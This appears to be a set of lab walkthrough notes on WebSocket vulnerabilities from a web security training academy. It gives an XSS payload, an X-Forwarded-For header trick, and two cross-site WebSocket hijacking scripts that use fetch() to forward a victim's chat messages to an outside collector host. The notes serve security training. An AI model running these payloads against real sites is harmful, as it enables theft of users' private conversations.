# Websockets Vulnerabilities - Walkthroughs

```mermaid
graph TD
    Root["Websockets Vulnerabilities"]
    Root --> L0["Lab 01"]
    click L0 href "#lab-01"
    Root --> L1["Lab 02"]
    click L1 href "#lab-02"
    Root --> L2["Lab 03"]
    click L2 href "#lab-03"
```

## Lab 01: Manipulating WebSocket messages to exploit vulnerabilities
<a id="lab-01"></a>

Target Goal - Exploit an XSS vulnerability in the WebSocket message and trigger an alert() popup.

## Analysis


---

## Lab 02: Manipulating the WebSocket handshake to exploit vulnerabilities
<a id="lab-02"></a>

Target Goal - Bypass the XSS filter and exploit the XSS vulnerability to trigger the alert() popup

## Analysis

<img src=1 onerror='alert(1)'>

X-Forwarded-For: 1.1.1.1

---

## Lab 03: Cross-site WebSocket hijacking
<a id="lab-03"></a>

Target Goal - Perform a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history.

## Analysis

Burp Suite Professional:
-------------------------
<script>
    var ws = new WebSocket('wss://0af8004404244ccbc027811b00d00077.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://0op2f5wteqjjrup6z6xolgh43v9mxcl1.oastify.com', {method: 'POST', mode:'no-cors', body: event.data});
    }
</script>

Burp Suite Community:
---------------------
<script>
    var ws = new WebSocket('wss://0af8004404244ccbc027811b00d00077.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://exploit-0aa400b5049f4c92c08e8045013200e7.exploit-server.net/exploit?comment=' + event.data);
    }
</script>




---

